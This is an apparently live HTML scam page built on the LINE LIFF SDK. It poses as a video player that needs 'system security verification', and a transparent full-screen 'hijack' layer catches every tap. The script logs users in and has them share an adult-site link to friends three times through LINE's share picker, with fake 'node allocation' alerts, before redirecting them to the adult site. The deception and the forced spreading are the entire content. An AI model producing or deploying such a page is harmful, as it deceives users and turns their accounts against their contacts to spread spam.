<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>系統驗證中...</title>
    <!-- 1. 修正：完整的 LINE SDK 網址 -->
    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, "Helvetica Neue", sans-serif; }
        
        /* 1. 背景優化：更深邃、更沉穩，邊緣不留白 */
        .video-bg { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: url('https://syu126147.github.io/hdvideo/cover.jpg') center/cover no-repeat; 
            filter: brightness(0.3) blur(8px); 
            transform: scale(1.1); /* 微幅放大防止全螢幕時邊緣穿幫 */
            z-index: 1; 
        }

        .player-box { 
            position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; 
            height: 100vh; color: #fff; text-align: center; padding: 0 40px; 
        }

        /* 2. 播放按鈕：沉穩、專業、不浮誇（移除跳動，改為極慢微光） */
        .play-btn { 
            width: 72px; height: 72px; 
            background: rgba(200, 0, 0, 0.95); 
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            border: 1.5px solid rgba(255, 255, 255, 0.7); 
            margin-bottom: 35px; 
            box-shadow: 0 0 20px rgba(200, 0, 0, 0.4);
            /* 3 秒一循環的極慢微光，非常像真實系統狀態燈 */
            animation: glow 3s ease-in-out infinite; 
        }
        
        .play-btn::after { 
            content: ''; border-style: solid; border-width: 10px 0 10px 18px; 
            border-color: transparent transparent transparent #fff; margin-left: 5px; 
        }

        /* 3. 真實感關鍵：移除縮放(scale)，只讓邊緣紅光緩慢深呼吸 */
        @keyframes glow {
            0% { box-shadow: 0 0 15px rgba(200, 0, 0, 0.3); opacity: 0.95; }
            50% { box-shadow: 0 0 35px rgba(200, 0, 0, 0.6); opacity: 1; }
            100% { box-shadow: 0 0 15px rgba(200, 0, 0, 0.3); opacity: 0.95; }
        }

        .msg { font-size: 18px; font-weight: 600; line-height: 1.8; letter-spacing: 1px; color: #f0f0f0; text-shadow: 0 2px 10px #000; }
        .sub-msg { font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 15px; letter-spacing: 0.5px; }
        
        #hijack-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent; -webkit-tap-highlight-color: transparent; }
    </style>
</head>
<body>
    <div class="video-bg"></div>
    <div class="player-box">
        <div class="play-btn"></div>
        <div class="msg">【系統安全驗證】<br>當前線路擁擠，需完成分配程序</div>
        <div class="sub-msg">(完成 3 位節點分配後將自動開啟 4K 線路)</div>
    </div>
    <div id="hijack-layer" onclick="forceHijack()"></div>

     <script>
        const LIFF_ID = "2009200124-rSJ8f72Y"; 
        const SUCCESS_URL = "https://18avideo.com/VKUFu?v=" + new Date().getTime();
        let shareCount = 0;

        async function init() {
            try {
                await liff.init({ liffId: LIFF_ID });
                // 1. 修復：自動導向官方入口（解決改名後的白屏問題）
                if (!liff.isInClient() && window.location.hostname.includes("github.io")) {
                    window.location.replace("https://liff.line.me/" + LIFF_ID);
                    return;
                }
                if (!liff.isLoggedIn()) {
                    liff.login(); 
                }
            } catch (err) { console.error(err); }
        }

        async function forceHijack() {
            if (!liff.isLoggedIn()) return;
            alert("【分配程序啟動】\n\n請選擇 3 位好友作為「流量分配節點」。\n完成後系統將自動為您解除觀看限制。");
            
            try {
                const res = await liff.shareTargetPicker([
                      {
                        "type": "text",
                        "text": "https://18avideo.com/Tws7k?v="+ new Date().getTime()
                    }
                ]);

                if (res) {
                    shareCount++; 
                    // 2. 修改外部判定：從 < 2 改為 < 3，達成三次劫持
                    if (shareCount < 3) { 
                        alert("【系統審核中】目前已完成 " + shareCount + "/3 組節點。\n偵測到線路擁擠，請「再次確實」分配好友。");
                        setTimeout(forceHijack, 500); 
                    } else {
                        alert("【驗證完成】3組節點分配成功，即將為您導向頻道！");
                        window.location.replace(SUCCESS_URL); 
                    }
                } else {
                    alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
                }
            } catch (error) { console.error(error); }
        }

        window.onload = init;
    </script>
</body>
</html>


